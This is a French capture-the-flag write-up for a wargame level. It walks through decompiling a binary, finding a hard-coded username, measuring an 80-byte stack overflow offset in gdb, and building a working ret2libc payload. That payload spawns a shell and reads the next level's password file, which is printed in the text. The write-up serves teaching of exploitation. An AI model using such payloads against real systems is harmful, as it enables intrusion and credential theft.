# Level 1

On commence par décompiler le code. On observe différentes choses intéressantes. On remarque que le programme attend 2 entrées. 

```C
fgets(a_user_name, 0x100, _reloc.stdin);
fgets(auStack84, 100, _reloc.stdin);

printf("Enter Username: ");
puts("Enter Password: ");
```

La fonction `fgets` est appelée 2 fois, on devra donc saisir 2 arguments en entrée standard.

Notre programme attend un `username` et un `password`. 
La vérification du `username` se fait dans la fonction `verify_user_name`.

```C
printf("Enter Username: ");
fgets(a_user_name, 0x100, _reloc.stdin);
iStack20 = verify_user_name();
```

Le code décompilé de cette fonction est assez incompréhensible. On observe une chaine de caractères dans le code.

```C
pcVar3 = (code *)"dat_wil";
```

On suppose que l'entrée attendue pour le `username` est `dat_wil`. On peut vérifier cela en rentrant cet `input` dans notre programme.

```
> ./level01
[...]
Enter Username: test_username
verifying username....

nope, incorrect username...
> ./level01
[...]
Enter Username: dat_wil
verifying username....

Enter Password:
```
Notre hypothèse est vérifiée, notre programme attend `dat_wil` comme `username`.

Pour le `password`, cela semble plus complexe. En effet, le programme semble renvoyer dans tout les cas `nope, incorrect password ...\n`.

```C
if (iStack20 == 0) {
	puts("Enter Password: ");
	fgets(auStack84, 100, _reloc.stdin);
	iStack20 = verify_user_pass((char *)auStack84);
	if ((iStack20 == 0) || (iStack20 != 0)) {
		puts("nope, incorrect password...\n");
		uVar1 = 1;
	}
	else {
		uVar1 = 0;
	}
}
```

On voit qu'au moment de la vérification du `password`, une fonction `verify_user_pass` est appelée. 

Le code décompilé de cette fonction n'est pas lisible. On voit seulement une chaine de caractères en clair dans le code.

```C
puVar2 = (uint8_t *)"admin";
```

En essayant de mettre `admin` comme `password`, on obtient toujours le même résultat, à savoir `nope, incorrect password...`.

La fonction `fgets` nous permet de saisir notre `password`.
On observe que notre `input` sera stocké dans un `buffer` de `16` octets et que `100` caractères seront lus.

```C
undefined4 auStack84 [16];
fgets(auStack84, 100, _reloc.stdin);
```

Nous allons afficher la `stack` après le `call` à `fgets` lorsque nous avons saisis un `password` pour voir ce qu'il se passe.

```
> gdb ./level01
> (gdb) disass main 
[...]
 	0x08048574 <+164>:	call   0x8048370 <fgets@plt>
	0x08048579 <+169>:	lea    0x1c(%esp),%eax
   	0x0804857d <+173>:	mov    %eax,(%esp)
   	0x08048580 <+176>:	call   0x80484a3 <verify_user_pass>
[...]
> (gdb) b *0x08048580
[...]
> (gdb) r 
[...]
Enter Username: dat_wil
[...]
Enter Password:
AAAA

Breakpoint 1, 0x08048580 in main ()
> (gdb) x $esp
0xffffd680:	0xffffd69c
> (gdb) x $ebp+0x04
0xffffd6ec:	0xf7e45513
> (gdb) x/30wx $esp
0xffffd680:	0xffffd69c	0x00000064	0xf7fcfac0	0x00000001
		      ^
			  adresse du buffer
0xffffd690:	0xffffd8ac	0x0000002f	0xffffd6ec	0x41414141
												  ^
												  AAAA
0xffffd6a0:	0x0000000a	0x00000000	0x00000000	0x00000000
0xffffd6b0:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd6c0:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd6d0:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd6e0:	0xf7fceff4	0x00000000	0x00000000	0xf7e45513
												  ^
												  eip
0xffffd6f0:	0x00000001	0xffffd784
```

On observe plusieurs choses très intéressantes. Tout d'abord, on a `break` après le `fgets` contenant notre `input` `password`. 
Nous avons mis `AAAA` afin de voir où ils sont copiés pour observer notre `buffer` dans la `stack`.
L'adresse de `eip` est stockée à `ebp+0x04`.
L'adresse du début du `buffer` est située à l'adresse pointée par `esp`. C'est l'argument de la fonction `fgets`.
Nous avons visualisé l'adresse de notre `buffer` : `0xffffd69c` ainsi que celle de `eip` : `0xffffd6ec`. 

Pour connaître le nombre de caractères necessaires afin d'écraser `eip`, nous pouvons effectuer ce calcul :

```
nombre_de_caractères = adresse_eip - adresse_buffer
                     = 0xffffd6ec - 0xffffd69c
                     = 0x50
                     = 80 (base 10)
```

Il faudra alors mettre `80` caractères pour écraser `eip`. Nous avons vu précédement que la fonction `fgets` lisait `100` caractères. En mettant `80` caractères, nous pourrons donc écraser `eip`.

Notre programme n'exécute pas de `shell` et nous pouvons écraser `eip`. L'exploit `Ret2libc` semble réalisable.
Pour ce faire, nous allons construire notre exploit de cette façon : 

```
[username_valide] + [80 caractères] + [adresse de system] + [adresse_retour_system] + [adresse_bin_sh]
```

Trouvons maintenant l'adresse `system` et de `bin/sh`. 

```
> (gdb) p system
$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
> (gdb) find __libc_start_main,+99999999,"/bin/sh"
0xf7f897ec
[...]
```
Nous pouvons maintenant construire notre payload. 

```
[dat_wil\n] + [A*80] + [\xd0\xae\xe6\xf7] + [DAMN] + [\xec\x97\xf8\xf7]

python -c 'print "dat_wil\n" + "A"*80 + "\xd0\xae\xe6\xf7" + "DAMN" + "\xec\x97\xf8\xf7"' > /tmp/hack01
cat /tmp/hack01 - | ./level01
whoami
level02
cat /home/users/level02/.pass
PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
```